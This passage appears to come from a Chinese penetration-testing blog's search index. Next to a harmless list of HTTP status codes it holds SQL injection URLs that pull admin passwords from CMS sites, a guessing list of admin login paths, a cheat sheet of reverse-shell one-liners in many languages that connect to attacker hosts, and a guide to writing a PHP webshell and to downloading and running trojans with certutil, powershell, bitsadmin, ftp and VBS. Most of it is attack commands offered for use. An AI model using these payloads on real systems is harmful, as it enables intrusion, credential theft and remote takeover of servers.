<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/NewsType.asp?SmallClass=&apos;%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20&apos;&apos;=&apos;’</span><br></pre></td></tr></table></figure>
<p>后台地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/admin/index.asp</span><br><span class="line">/admin/login.asp</span><br><span class="line">/admin/admin_login.asp</span><br><span class="line">/manage/index.asp</span><br><span class="line">/manage/login.asp</span><br><span class="line">/manage/admin_login.asp</span><br><span class="line">/admin/index.aspx</span><br><span class="line">/admin/login.aspx</span><br><span class="line">/admin/admin_login.aspx</span><br><span class="line">/manage/index.aspx</span><br><span class="line">/manage/login.aspx</span><br><span class="line">/manage/admin_login.aspx</span><br><span class="line">/admin/index.php</span><br><span class="line">/admin/login.php</span><br><span class="line">/admin/admin_login.php</span><br><span class="line">/manage/index.php</span><br><span class="line">/manage/login.php</span><br><span class="line">/manage/admin_login.php</span><br></pre></td></tr></table></figure>
<p>第二个：<br>关键字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有限公司--Powered by ASPCMS 2.0</span><br></pre></td></tr></table></figure>
<p>EXP:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20&#123;prefix&#125;user</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP状态码</title>
    <url>/2018/05/13/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</url>
    <content><![CDATA[<h3 id="1-信息类-：表示接收到请求并且继续处理"><a href="#1-信息类-：表示接收到请求并且继续处理" class="headerlink" title="1(信息类)：表示接收到请求并且继续处理"></a>1(信息类)：表示接收到请求并且继续处理</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100——客户必须继续发出请求</span><br><span class="line">101——客户要求服务器根据请求转换HTTP协议版本</span><br></pre></td></tr></table></figure>
<h3 id="2-响应成功类-：表示动作被成功接收、理解和接受"><a href="#2-响应成功类-：表示动作被成功接收、理解和接受" class="headerlink" title="2(响应成功类)：表示动作被成功接收、理解和接受"></a>2(响应成功类)：表示动作被成功接收、理解和接受</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200——表明该请求被成功地完成，所请求的资源发送回客户端</span><br><span class="line">201——提示知道新文件的URL</span><br><span class="line">202——接受和处理、但处理未完成</span><br><span class="line">203——返回信息不确定或不完整</span><br><span class="line">204——请求收到，但返回信息为空</span><br><span class="line">205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件</span><br><span class="line">206——服务器已经完成了部分用户的GET请求</span><br></pre></td></tr></table></figure>
<h3 id="3-重定向类-：为了完成指定的动作，必须接受进一步处理"><a href="#3-重定向类-：为了完成指定的动作，必须接受进一步处理" class="headerlink" title="3**(重定向类)：为了完成指定的动作，必须接受进一步处理"></a>3**(重定向类)：为了完成指定的动作，必须接受进一步处理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">300——请求的资源可在多处得到</span><br><span class="line">301——本网页被永久性转移到另一个URL</span><br><span class="line">302——请求的网页被转移到一个新的地址，但客户访问仍继续通过原始URL地址，重定向，新的URL会在response中的Location中返回，浏览器将会使用新的URL发出新的Request。</span><br><span class="line">303——建议客户访问其他URL或访问方式</span><br><span class="line">304——自从上次请求后，请求的网页未修改过，服务器返回此响应时，不会返回网页内容，代表上次的文档已经被缓存了，还可以继续使用</span><br><span class="line">305——请求的资源必须从服务器指定的地址得到</span><br><span class="line">306——前一版本HTTP中使用的代码，现行版本中不再使用</span><br><span class="line">307——申明请求的资源临时性删除</span><br></pre></td></tr></table></figure>

<h3 id="4-客户端错误类-：请求包含错误语法或不能正确执行"><a href="#4-客户端错误类-：请求包含错误语法或不能正确执行" class="headerlink" title="4**(客户端错误类)：请求包含错误语法或不能正确执行"></a>4**(客户端错误类)：请求包含错误语法或不能正确执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400——客户端请求有语法错误，不能被服务器所理解</span><br><span class="line">401——请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</span><br><span class="line">HTTP 401.2 - 未授权：服务器配置问题导致登录失败</span><br><span class="line">HTTP 401.3 - ACL 禁止访问资源</span><br><span class="line">HTTP 401.4 - 未授权：授权被筛选器拒绝</span><br><span class="line">HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败</span><br><span class="line">402——保留有效ChargeTo头响应</span><br><span class="line">403——禁止访问，服务器收到请求，但是拒绝提供服务</span><br><span class="line">HTTP 403.1 禁止访问：禁止可执行访问</span><br><span class="line">HTTP 403.2 - 禁止访问：禁止读访问</span><br><span class="line">HTTP 403.3 - 禁止访问：禁止写访问</span><br><span class="line">HTTP 403.4 - 禁止访问：要求 SSL</span><br><span class="line">HTTP 403.5 - 禁止访问：要求 SSL 128</span><br><span class="line">HTTP 403.6 - 禁止访问：IP 地址被拒绝</span><br><span class="line">HTTP 403.7 - 禁止访问：要求客户证书</span><br><span class="line">HTTP 403.8 - 禁止访问：禁止站点访问</span><br><span class="line">HTTP 403.9 - 禁止访问：连接的用户过多</span><br><span class="line">HTTP 403.10 - 禁止访问：配置无效</span><br><span class="line">HTTP 403.11 - 禁止访问：密码更改</span><br><span class="line">HTTP 403.12 - 禁止访问：映射器拒绝访问</span><br><span class="line">HTTP 403.13 - 禁止访问：客户证书已被吊销</span><br><span class="line">HTTP 403.15 - 禁止访问：客户访问许可过多</span><br><span class="line">HTTP 403.16 - 禁止访问：客户证书不可信或者无效</span><br><span class="line">HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效</span><br><span class="line">404——一个404错误表明可连接服务器，但服务器无法取得所请求的网页，请求资源不存在。eg：输入了错误的URL</span><br><span class="line">405——用户在Request-Line字段定义的方法不允许</span><br><span class="line">406——根据用户发送的Accept拖，请求资源不可访问</span><br><span class="line">407——类似401，用户必须首先在代理服务器上得到授权</span><br><span class="line">408——客户端没有在用户指定的饿时间内完成请求</span><br><span class="line">409——对当前资源状态，请求不能完成</span><br><span class="line">410——服务器上不再有此资源且无进一步的参考地址</span><br><span class="line">411——服务器拒绝用户定义的Content-Length属性请求</span><br><span class="line">412——一个或多个请求头字段在当前请求中错误</span><br><span class="line">413——请求的资源大于服务器允许的大小</span><br><span class="line">414——请求的资源URL长于服务器允许的长度</span><br><span class="line">415——请求资源不支持请求项目格式</span><br><span class="line">416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求也不包含If-Range请求头字段</span><br><span class="line">417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。</span><br></pre></td></tr></table></figure>
<h3 id="5-服务端错误类-：服务器不能正确执行一个正确的请求"><a href="#5-服务端错误类-：服务器不能正确执行一个正确的请求" class="headerlink" title="5**(服务端错误类)：服务器不能正确执行一个正确的请求"></a>5**(服务端错误类)：服务器不能正确执行一个正确的请求</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP 500 - 服务器遇到错误，无法完成请求</span><br><span class="line">HTTP 500.100 - 内部服务器错误 - ASP 错误</span><br><span class="line">HTTP 500-11 服务器关闭</span><br><span class="line">HTTP 500-12 应用程序重新启动</span><br><span class="line">HTTP 500-13 - 服务器太忙</span><br><span class="line">HTTP 500-14 - 应用程序无效</span><br><span class="line">HTTP 500-15 - 不允许请求 global.asa</span><br><span class="line">Error 501 - 未实现（Web 服务器不理解或不支持它在客户端发送给它的 HTTP 数据流中找到的 HTTP 方法。）</span><br><span class="line">HTTP 502 - 网关错误HTTP 503：由于超载或停机维护，服务器目前无法使用，一段时间后可能恢复正常</span><br></pre></td></tr></table></figure>








]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下反弹shell方法汇总</title>
    <url>/2018/04/13/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h4 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h4><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>注意这个是由解析shell的bash完成，所以某些情况下不支持</p>
<h4 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>

<h4 id="python版本："><a href="#python版本：" class="headerlink" title="python版本："></a>python版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<h4 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>

<h4 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>

<h4 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure>

<h4 id="java版本："><a href="#java版本：" class="headerlink" title="java版本："></a>java版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h4 id="lua版本："><a href="#lua版本：" class="headerlink" title="lua版本："></a>lua版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;10.0.0.1&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure>

<h4 id="nc不使用-e："><a href="#nc不使用-e：" class="headerlink" title="nc不使用-e："></a>nc不使用-e：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hacker:nc -lvnp listenport</span><br><span class="line">Victim:mknod /tmp/backpipe p</span><br><span class="line">Victim:/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<h4 id="不使用nc"><a href="#不使用nc" class="headerlink" title="不使用nc"></a>不使用nc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Method 1:</span><br><span class="line">Hacker: nc -nvlpp 8080</span><br><span class="line">Victim: /bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line">Method 2:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br><span class="line">Method 3:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Hacker: nc -nvlpp8888</span><br><span class="line">Victim: telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>在windows上免杀传马</title>
    <url>/2018/04/13/%E5%9C%A8windows%E4%B8%8A%E5%85%8D%E6%9D%80%E4%BC%A0%E9%A9%AC/</url>
    <content><![CDATA[<p>本文所写的是当服务器只有命令执行时，如果通过命令执行去上传木马或者webshell文件的方法总结：</p><a id="more"></a>
<h3 id="一：一句话"><a href="#一：一句话" class="headerlink" title="一：一句话"></a>一：一句话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo ^&lt;^?php @eval($_POST[1])?^&gt;^ &gt; C:\www\</span><br></pre></td></tr></table></figure>
<p>通过echo命令将一句话木马输出到C盘www目录</p>
<p>注：我们可以看到一句话木马的两边大于小于号被加上了^符号，那是应为DOS下此类符号是存在具体意义的，并不是单纯的字符，所以我们需要将其转义。这个方法是我自己找的，上传了一句话，自己菜刀连就好了。</p>
<h3 id="二：FTP"><a href="#二：FTP" class="headerlink" title="二：FTP"></a>二：FTP</h3><p>自己在公网上弄个FTP服务器，将pt.exe木马文件传上去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 1.1.1.1&gt;pt.txt&amp;echo anonymous&gt;&gt;pt.txt&amp;echo whatever&gt;&gt;pt.txt&amp;echo binary&gt;&gt;pt.txt&amp;echo lcd c:\&gt;&gt;echo get pt.exe&gt;&gt;pt.txt&amp;echo bye&gt;&gt;pt.txt&amp;ftp -s:pt.txt</span><br></pre></td></tr></table></figure>
<p>注：这是将所有命令合并成为一条命令了，会的人，都看的懂是啥意思。在这里就只解释一下pt.exe和pt.txt的区别：</p>
<p>pt.exe是你的反弹木马程序，而pt.txt是一个文本文件，这个文本文件中保存了你这一长条命令的结果。</p>
<p>而这一长条命令中最后的一句命令ftp -s:pt.txt的意思是：让ftp程序去执行pt.txt文件。懂我什么意思了吧？<br>下面是pt.txt文件长得样子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open 1.1.1.1</span><br><span class="line">anonymous</span><br><span class="line">whatever</span><br><span class="line">binary</span><br><span class="line">lcd c:\</span><br><span class="line">get pt.exe</span><br><span class="line">bye</span><br></pre></td></tr></table></figure>
<p>这命令执行完之后，木马是下载下来了，但是执行还是要手动执行的。注注：“lcd c:\”的意思是指定下载的文件位置，有的时候有文件夹权限问题，需要指定路径，可选项</p>
<h3 id="三：certutil"><a href="#三：certutil" class="headerlink" title="三：certutil"></a>三：certutil</h3><p>使用certutil反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe /c &quot;certutil.exe -urlcache -split -f http://1.1.1.1/test.exe &amp;test.exe &amp;del test.exe&quot;</span><br></pre></td></tr></table></figure>

<p>我来解释一下这个命令是什么意思<br>让cmd去叫certutil这个证书管理程序下载<a href="http://1.1.1.1/这个网站下的test.exe并且执行这个test.exe文件，然后删掉test.exe文件。" target="_blank" rel="noopener">http://1.1.1.1/这个网站下的test.exe并且执行这个test.exe文件，然后删掉test.exe文件。</a></p>
<hr>
<p>2018年9月4号更新：<br>服务器禁止上传文件，那我们也可以用以下方法将文件下载到服务器</p>
<h3 id="vbs下载文件"><a href="#vbs下载文件" class="headerlink" title="vbs下载文件"></a>vbs下载文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://233.233.233.233/2333.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\2333.exe&quot;,2</span><br></pre></td></tr></table></figure>
<h3 id="powershell下载"><a href="#powershell下载" class="headerlink" title="powershell下载"></a>powershell下载</h3><p>注意：内核5.2以下版本可能无效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell(new-object System.Net.WebClient).DownloadFile( &apos;http://233.233.233.233/2333.exe&apos;,&apos;C:\2333.exe&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="bitsadmin下载"><a href="#bitsadmin下载" class="headerlink" title="bitsadmin下载"></a>bitsadmin下载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://233.233.233.233/2333.exe  C:\2333.exe</span><br></pre></td></tr></table></figure>
<p>注意：不支持https、ftp协议，使用kali的simplehttpserver作服务器会报错</p>
]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
</search>
